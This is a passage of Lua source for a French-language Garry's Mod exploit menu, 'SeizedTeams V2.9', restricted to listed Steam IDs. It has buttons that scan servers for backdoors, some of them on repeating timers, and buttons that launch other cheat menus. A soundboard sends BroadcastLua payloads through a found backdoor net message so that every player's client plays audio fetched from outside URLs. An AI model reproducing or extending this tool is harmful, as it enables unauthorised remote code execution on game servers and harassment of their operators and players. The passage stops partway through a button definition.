    or FillFrameRates == "STEAM_0:1:206501047"
	 or FillFrameRates == "STEAM_0:1:193061025" 
or FillFrameRates == "STEAM_0:1:70241110"
 or FillFrameRates == "STEAM_0:0:42765014"
  or FillFrameRates == "STEAM_0:1:111882967"
 
 
then iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(750,750)
iZNX.Menu:SetTitle(" ")
iZNX.Menu:Center()
iZNX.Menu:MakePopup()
iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(25,25,25,0))
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(110,31,23, 250) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(0, 0, 0, 0) )
surface.DrawRect( 35, 100, w - 60, h - 150 )
surface.SetDrawColor( Color(255, 255, 255, 0) )
surface.DrawOutlinedRect( 35, 100, w - 60, h - 152 )
surface.DrawOutlinedRect( 36, 101, w - 62, h - 154 )
surface.SetDrawColor( Color(0, 0, 0, 0) )
surface.DrawRect( 160, 20, w - 300, h - 680 )
surface.SetDrawColor( Color(255, 255, 255, 0) )
surface.DrawOutlinedRect( 160, 20, w - 300, h - 680 )
surface.DrawOutlinedRect( 161, 21, w - 302, h - 682 )
draw.DrawText( "SeizedTeamS V2.9", "DermaLarge", 310, 25, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
draw.DrawText( " ", "Trebuchet24", 175, 50, Color(25,25,25, 250) )
end
local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 80, iZNX.Menu:GetTall() - 180 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 50, 120 )
Plist:SetName( "" )
iZNX.MakeFunctionButton( iZNX.Menu, 620, 30, "Charger Sauvegarde", iZNX.LoadConfig, "Charger une Config" )
iZNX.MakeFunctionButton( iZNX.Menu, 50, 30, "Sauvegarder", iZNX.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(110,31,23, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(255,255,255, 255) )
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
return end
end)
 
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[                   
                  Ouvrez le menu a l'aide de la commande "SeizedTeam_menu" ou "bind (touche) SeizedTeam_menu" dans votre console :^)
         
  ]])
MsgC (Color(0,0,0), [[                                      
H                 @@@@@@@@@@@@@@@@@@&&&@@@@@&@@@@@@@@@@@@@@&@@@@@&&&@@@@@@@@@@@@@@@@@              
A                 @@@@@@@@@@@@@@@@@@@@@@@%*@@,@@@@@@@@@@@@,@@/&@@@@@@@@@@@@@@@@@@@@@@              
V                 @@@@@@@@@@@@@@* .@@@@.%@@@@@@.#@@@@@@(.@@@@@@@.@@@@. (@@@@@@@@@@@@@              
E                 @@@@@@@@.@.@@@@ @ @@@.@ @@@@@@@@@@@@@@@@@@@@ @.@@@ @ @@@@,@.@@@@@@@              
                  @@@@@@@ &@, @@*@@@@@%@@@ .@&&@*.@@@@.(@&&@* @@@#&@@@ @@@ ,@% @@@@@@              
                  @@@@@@@ @@@@%@@@@@@@@.@@@@@ @@@@@@@@@@@@.@@@@@.@@@@&&@@/@@@@.@@@@@@              
                  @@@@@@@ &@@@  /@@,@@@@,@@@@@@@& &@@& &@@@@@@@.@@@@.@@(  @@@% @@@@@@              
A                 @@@@@@@ &@(/#&@@ @@@//#@@@@@*@@ @@@@ @@/@@@@.@@#(@@ @@&%*(@% @@@@@@              
                  @@@@@@@@@#@@@@/@   (@@@@@% @&&@.    ,@@&@ /@@@@@%   &(@@@@&@@@@@@@@              
                  @@@@@@@@@, @@@&  /@@@@@@,@@*@@@@@  @@@@@/@@.@@@@@@/  %@@@  @@@@@@@@              
G                 @@@@@@@@@@ @@@@@@@@@@@@ @@@ @@@@    @@@@.@@@ @@@@@@@@@@@@ @@@@@@@@@              
O                 @@@@@@@@ @/@@@@@@@@@@@@*#@@@@ ,/((((*. @@@@(/@@@@@@@@@@@@/@ @@@@@@@              
O                 @@@@@@@ &,&@.&( @@@@@@@#  @@ @#####&@ @@  %@@@@@@@ #%.@% % @@@@@@              
D                 @@@@@@&@ @  .@ @                                   .@ @/  @ &@@@@@@              
                  @@@@@@&@ #@@. %%  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. .%%  @@& &@@@@@@              
                  @@@@@@&@@. @@@@@  .@..@@@@@@@@@@@@@@@@@@@@@@@@..@.  @@@@@  @@@@@@@@              
T                 @@@@@@@ @@@,%@/@@ .@@@@%,,,   /@&@@%@*   ,,,&@@@@. @@/@&*@@@.@@@@@@              
I                 @@@@@@@@.@@@%*@ @ .@@@@@@@@@@@@ @@@@ @@@@@@@@@@@@. @ @,/@@@.@@@@@@@              
M                 @@@@@@@@@@(@.@@   .@@@@@@@,,,,#@@@(@@/.,,,&@@@@@@. . @@/@/@@@@@@@@@              
E                 @@@@@@@@@@@ @@@*  .@@@@@@@@,  @@@@(@@@@*  @@@@@@@. ./@@@ @@@@@@@@@@              
                  @@@@@@@@@@@ .@@@  .@@&@@@@@&.@@@@@,@@@@ *@@@@@@,@.  &@@/.@@@@@@@@@@              
                  @@@@@@@@@@@@.@@   .@.@@@@@@&.@@@@@#@@@@ @@@@@@@#@.   @@/@@@@@@@@@@@              
W                 @@@@@@@@@@@@%@@   .@#@@@@@@@@@@.(@#%,@@@@@@@@@@@.. . @@/@@@@@@@@@@@              
I                 @@@@@@@@@@@@@*@   .@.@@@@@@@@@@@(@@%@@@@@@@@@@@(@. . @,@@@@@@@@@@@@              
T                 @@@@@@@@@@@@@@(@  .*%@@@@&&  & @@@@@@@@@@@/@@@@@@. .@/@@@@@@@@@@@@@@            
H                 @@@@@@,,,,,,@@@@  .*%@@@@@,  & @@@@@@@@,  &@@&@,@. .@@@@,,,,,*@@@@@@@            
                  @@@@@@......@#..  .*%&%@@ .@@@ @@@@@@@@@@@@@@@@@..  ..%@......@@@@@@@            
                  @@@@@@@% # ,      .*%&@@.,@@@@ @@@@@@@@@@@@@.,@ @.      . & (@@@@@@@            
L                 @@@@@@@@@#  @/    .*#&&&&&&&&% %@@@@#@@%@@ @& @ ,. .  (@  &@@@@@@@@              
O                 @@@@@@@@@@  %      ..............................  .   / .@@@@@@@@@              
K                   @@@@@@@@% /@                                   .@* /@@@@@                
I                   @@@@@@@@  @@ &.@%@ ,@%@ %  . %# ,  & @%@. @%@.& &&  @@@                
D                   @@@@@@@@  @@ &.* &&,  @ %  . %# ,  & @  .&% ..& &@  @@@                
E                   @@@@@@@@# @@ &.* & ,  @ %  . %# ,  & @  . % ..& &@ *@@@                
V                   @@@@@@@@% &@ &.* & ,  @ %  . %# ,  & @  . % ..& &% /@@@                
                    @@@@@@@@% /@ &.* & ,  @ %  . %# ,  & @  . % ..& &* /@@@                
                    @@@@@@@@% %@ &.* & ,  @ %  . %# ,  & @  . % ..&  /@@@@                
                    @@@@@@@@@@@@ &.* & ,  @ %  . %# ,  & @  . % ..& &@@@@                
                    @@@@@@@@@@@@@&.* & ,  @ % #. %# ,( & @  . % ..@@@@@@@                
                    @@@@@@@@@@@@@&.* & ,  @ % *. %# ,, & @  . % ..@@@@@@@                
                    @@@@@@@@@@@@@&.* @ ,  @ %  . %# ,  & @  . @ ..@@@@@@@
SeizedTeam                                          
  ]])

    end --fin du SeizedTeamsV2.9



Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Exploit Menu" )
    SploitNotify("SeizedTeams2.9")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeam" ) -- What happens when you press the button
end

------------------------------
--    SCAN BACKDOOR ALL     --
------------------------------
--DANS LE CONTROLLER
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Controller)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Controller)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Controller)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

--DANS LE TARGETS
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Targets)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

--DANS LE MISC
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Misc)
        Macro:SetText( "SmegHack" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SmegHack lanc�" )
    SploitNotify("SmegHack")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SmegHack_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Targets)
        Macro:SetText( "SmegHack" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SmegHack lanc�" )
    SploitNotify("SmegHack lanc�")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SmegHack_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Controller)
        Macro:SetText( "SmegHack" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SmegHack lanc�" )
    SploitNotify("SmegHack lanc�")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SmegHack_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 190 )
		Macro:SetParent(Misc)
        Macro:SetText( "SeizedTeams" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SeizedTeams lanc�" )
    SploitNotify("SeizedTeams lanc�")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeams_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 190 )
		Macro:SetParent(Targets)
        Macro:SetText( "SeizedTeams" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SeizedTeams lanc�" )
    SploitNotify("SeizedTeams lanc�")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeams_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 190 )
		Macro:SetParent(Controller)
        Macro:SetText( "DEV" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "il est en dev connard" )
    SploitNotify("il est en dev connard")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeams_Menu" ) -- What happens when you press the button
end



------------------------------------------------------------------------------
----------------- SOUNDBOARD ET MUSIQUE
------------------------------------------------------------------------------

-- MUSIQUE 


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Be Friend" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/whcant.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Be Friend activ�" )
    SploitNotify("Musique - Be Friend ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Salut c'est cool" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/salutccool.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Salut c'est cool activ�" )
    SploitNotify("Musique - Salut c'est cool ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Targets)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Tenir ta main" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Gr%C3%A9goire.mp3\", \"mono\", function()end )]])")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Tenir ta main activ�" )
    SploitNotify("Musique - Tenir ta main ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Wesh Alors [JUL]" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end

Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/wesh.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Wesh Alors [JUL] activ�" )
    SploitNotify("Musique - Jul WESH ALORS ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - MondotekAlive" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Mondotek%20-%20Alive%20(Ph%20Electro%20Remix).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - MondotekAlive activ�" )
    SploitNotify("Musique - MondotekAlive ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Un �l�phant " )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Un%20%C3%A9l%C3%A9phant%20qui%20se%20balan%C3%A7ait.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Un �l�phant qui se balancait activ� !" )
    SploitNotify("Musique - Un �l�phant qui se balancait ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Chuis bo" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/chuis%20bo.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Chuis bo" )
    SploitNotify("Musique - Chuis bo ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 240 )
